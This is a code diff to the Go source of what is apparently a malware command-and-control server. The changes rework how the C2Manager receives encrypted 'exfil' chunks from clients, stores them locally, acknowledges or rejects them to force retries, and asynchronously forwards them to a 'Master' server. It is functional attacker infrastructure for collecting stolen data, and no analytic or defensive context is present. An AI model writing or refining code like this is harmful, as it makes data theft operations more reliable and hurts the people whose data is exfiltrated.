@@ -811,32 +811,40 @@ func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (b
 				
 				// IMPORTANT: Store locally BEFORE forwarding to Master for recovery capability
 				// Use tag as session identifier since we don't have the full session ID yet
+				localStored := false
 				if c2.db != nil {
 					tagSessionID := fmt.Sprintf("tag_%s", frame.SessionTag)
 					if _, dbErr := c2.db.RecordExfilChunk(tagSessionID, frame.Counter, plaintext); dbErr != nil {
+						logf("[Exfil] Local storage failed for orphan chunk tag=%s idx=%d: %v", frame.SessionTag, frame.Counter, dbErr)
+					} else {
+						localStored = true
 						if c2.debug {
-							logf("[Exfil] Local storage failed for orphan chunk tag=%s idx=%d: %v", frame.SessionTag, frame.Counter, dbErr)
+							logf("[Exfil] Stored orphan chunk locally tag=%s idx=%d bytes=%d", frame.SessionTag, frame.Counter, len(plaintext))
 						}
-					} else if c2.debug {
-						logf("[Exfil] Stored orphan chunk locally tag=%s idx=%d bytes=%d", frame.SessionTag, frame.Counter, len(plaintext))
 					}
 				}
 				
-				completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), payloadB64)
-				if err == nil {
-					if c2.debug {
-						logf("[Exfil] Forwarded orphan chunk tag=%s idx=%d to Master", frame.SessionTag, frame.Counter)
+				// Forward to Master asynchronously
+				go func() {
+					completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), payloadB64)
+					if err == nil {
+						if c2.debug {
+							logf("[Exfil] Forwarded orphan chunk tag=%s idx=%d to Master", frame.SessionTag, frame.Counter)
+						}
+						if completed && c2.debug {
+							logf("[Exfil] Master signaled session for tag %s is complete", frame.SessionTag)
+						}
+					} else if c2.debug {
+						logf("[Exfil] Failed to forward orphan chunk tag=%s: %v", frame.SessionTag, err)
 					}
-					// If completed, we don't really need to do anything locally since we don't have the session
-					if completed && c2.debug {
-						logf("[Exfil] Master signaled session for tag %s is complete", frame.SessionTag)
-					}
+				}()
+				
+				// ACK based on local storage success, not Master (async)
+				if localStored {
 					return true, nil
 				}
-
-				if c2.debug {
-					logf("[Exfil] Failed to forward orphan chunk tag=%s: %v - buffering", frame.SessionTag, err)
-				}
+				// If local storage failed, NACK to trigger retry
+				return false, fmt.Errorf("local storage failed for orphan chunk")
 			} else if c2.debug {
 				logf("[Exfil] Failed to decrypt orphan chunk tag=%s: %v - buffering", frame.SessionTag, decryptErr)
 			}
@@ -1109,20 +1117,24 @@ func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clien
 	c2.mutex.Unlock()
 
 	// Persist locally for retry capability (in case Master is temporarily unavailable)
+	// CRITICAL: Only ACK if local persist succeeds - this ensures retries work
+	localPersisted := false
 	if c2.db != nil {
 		if _, dbErr := c2.db.RecordExfilChunk(sessionID, meta.ChunkIndex, plaintext); dbErr != nil {
-			if c2.debug {
-				logf("[Exfil] DB persist failed (session=%s idx=%d): %v", sessionID, meta.ChunkIndex, dbErr)
-			}
+			logf("[Exfil] DB persist failed (session=%s idx=%d): %v - NACK to trigger retry", sessionID, meta.ChunkIndex, dbErr)
+			// Don't ACK if we couldn't persist - client will retry
+			return false, fmt.Errorf("local persist failed: %w", dbErr)
 		}
+		localPersisted = true
 	}
 
 	if c2.debug {
 		logf("[Exfil] chunk session=%s idx=%d/%d bytes=%d - forwarding to Master", sessionID, meta.ChunkIndex, totalChunks, len(plaintext))
 	}
 
-	// ALWAYS forward to Master - Master handles deduplication and assembly
-	if masterClient != nil {
+	// Forward to Master asynchronously - Master handles deduplication and assembly
+	// We ACK based on local persist, not Master success (async retry handles Master failures)
+	if masterClient != nil && localPersisted {
 		// Build request with captured values (no race)
 		req := ExfilChunkRequest{
 			SessionID:   sessionID,
@@ -1137,7 +1149,7 @@ func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clien
 		go c2.submitExfilChunkToMasterDirect(req, sessionID, int(meta.ChunkIndex))
 	}
 
-	return true, nil
+	return localPersisted, nil
 }
 
 func (c2 *C2Manager) ensureExfilSession(sessionID, jobID, clientIP string) *ExfilSession {
